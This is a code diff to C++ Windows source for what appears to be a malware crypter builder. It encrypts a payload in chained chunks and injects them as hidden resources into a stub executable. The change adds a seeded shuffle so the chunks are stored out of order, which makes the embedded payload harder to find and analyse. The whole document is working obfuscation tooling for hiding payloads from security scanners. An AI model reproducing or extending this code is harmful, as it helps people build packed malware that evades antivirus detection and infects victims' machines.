@@ -22,9 +22,9 @@ struct PayloadIndex {
     uint16_t chunk_count;
     uint16_t first_chunk_id;
     uint32_t crc32;
+    uint16_t shuffle_seed;  // NEW: Add this line
 };
 #pragma pack(pop)
-
 // ============================================================================
 // GLOBAL
 // ============================================================================
@@ -217,7 +217,7 @@ std::vector<std::vector<BYTE>> EncryptPayloadChained(const char* payload, long s
 // FIXED RESOURCE INJECTION WITH PROPER ERROR CHECKING
 // ============================================================================
 bool InjectWithSeparateIndex(const std::vector<std::vector<BYTE>>& encrypted_chunks, long payloadSize, uint8_t first_key) {
-    cout << "[*] Starting resource injection..." << endl;
+    cout << "[*] Starting resource injection with shuffle..." << endl;
     
     // DEBUG: Check if Stub.exe exists and is valid
     DWORD attrib = GetFileAttributesA("Stub.exe");
@@ -248,7 +248,10 @@ bool InjectWithSeparateIndex(const std::vector<std::vector<BYTE>>& encrypted_chu
 
     srand((unsigned)time(nullptr));
     uint16_t first_chunk_id = 300 + (rand() % 400);
-
+    
+    // NEW: Generate reproducible shuffle seed
+    uint16_t shuffle_seed = (uint16_t)(GetTickCount() ^ rand());
+    
     PayloadIndex index{};
     index.magic = 0xCAFEBABE;
     index.first_key = first_key;
@@ -256,7 +259,9 @@ bool InjectWithSeparateIndex(const std::vector<std::vector<BYTE>>& encrypted_chu
     index.chunk_count = static_cast<uint16_t>(encrypted_chunks.size());
     index.first_chunk_id = first_chunk_id;
     index.crc32 = CalculateCRC32(fileBuffer, payloadSize);
-
+    index.shuffle_seed = shuffle_seed;  // NEW: Store seed
+    
+    cout << "[*] Using shuffle seed: " << shuffle_seed << endl;
     cout << "[*] Injecting index (ID 999) with " << encrypted_chunks.size() << " chunks starting at ID " << first_chunk_id << endl;
 
     // Inject index
@@ -269,26 +274,58 @@ bool InjectWithSeparateIndex(const std::vector<std::vector<BYTE>>& encrypted_chu
         return false;
     }
     cout << "[+] Index injected successfully" << endl;
-
-    // Inject chunks
+    
+    // NEW: Create shuffled order
+    std::vector<size_t> chunk_order(encrypted_chunks.size());
     for (size_t i = 0; i < encrypted_chunks.size(); ++i) {
-        WORD id = first_chunk_id + (WORD)i;
+        chunk_order[i] = i;
+    }
+    
+    // Shuffle using the seed (deterministic but random-looking)
+    std::mt19937 rng(shuffle_seed);
+    std::shuffle(chunk_order.begin(), chunk_order.end(), rng);
+    
+    // Debug output of shuffle order
+    cout << "[*] Shuffled chunk order (first 10): ";
+    for (size_t i = 0; i < min((size_t)10, chunk_order.size()); ++i) {
+        cout << chunk_order[i] << " ";
+    }
+    if (chunk_order.size() > 10) cout << "...";
+    cout << endl;
+    
+    // Display mapping for debugging
+    if (encrypted_chunks.size() <= 15) {
+        cout << "[*] Resource ID mapping:" << endl;
+        for (size_t i = 0; i < encrypted_chunks.size(); ++i) {
+            cout << "    Resource ID " << (first_chunk_id + i) 
+                 << " contains logical chunk " << chunk_order[i] << endl;
+        }
+    }
+
+    // NEW: Inject chunks in shuffled order
+    for (size_t resource_position = 0; resource_position < encrypted_chunks.size(); ++resource_position) {
+        size_t logical_chunk_idx = chunk_order[resource_position];
+        WORD resource_id = first_chunk_id + (WORD)resource_position;  // IDs stay sequential
         
-        if (encrypted_chunks[i].empty()) {
-            cerr << "[-] Chunk " << i << " is empty, skipping!" << endl;
+        if (encrypted_chunks[logical_chunk_idx].empty()) {
+            cerr << "[-] Logical chunk " << logical_chunk_idx << " is empty, skipping!" << endl;
             continue;
         }
         
-        if (!UpdateResourceA(hUpdate, "RCDATA", MAKEINTRESOURCEA(id),
+        cout << "[+] Injecting logical chunk " << logical_chunk_idx 
+             << " → Resource ID " << resource_id 
+             << " (position " << resource_position << ")" << endl;
+        
+        if (!UpdateResourceA(hUpdate, "RCDATA", MAKEINTRESOURCEA(resource_id),
                              MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
-                             (LPVOID)encrypted_chunks[i].data(),
-                             (DWORD)encrypted_chunks[i].size())) {
+                             (LPVOID)encrypted_chunks[logical_chunk_idx].data(),
+                             (DWORD)encrypted_chunks[logical_chunk_idx].size())) {
             DWORD err = GetLastError();
-            cerr << "[-] Failed to inject chunk ID " << id << "! Error: " << err << endl;
+            cerr << "[-] Failed to inject chunk ID " << resource_id 
+                 << " (logical chunk " << logical_chunk_idx << ")! Error: " << err << endl;
             EndUpdateResourceA(hUpdate, TRUE);
             return false;
         }
-        cout << "[+] Chunk " << i << " → ID " << id << " (" << encrypted_chunks[i].size() << " bytes)" << endl;
     }
 
     if (!EndUpdateResourceA(hUpdate, FALSE)) {
@@ -297,7 +334,12 @@ bool InjectWithSeparateIndex(const std::vector<std::vector<BYTE>>& encrypted_chu
         return false;
     }
 
-    cout << "\n[SUCCESS] All resources injected successfully!\n";
+    cout << "\n[SUCCESS] All resources injected with shuffle!" << endl;
+    cout << "          - Index at ID 999 with shuffle seed: " << shuffle_seed << endl;
+    cout << "          - Chunks start at ID: " << first_chunk_id << endl;
+    cout << "          - Total chunks: " << encrypted_chunks.size() << endl;
+    cout << "          - Stub must use same seed to reconstruct order" << endl;
+    
     return true;
 }
 
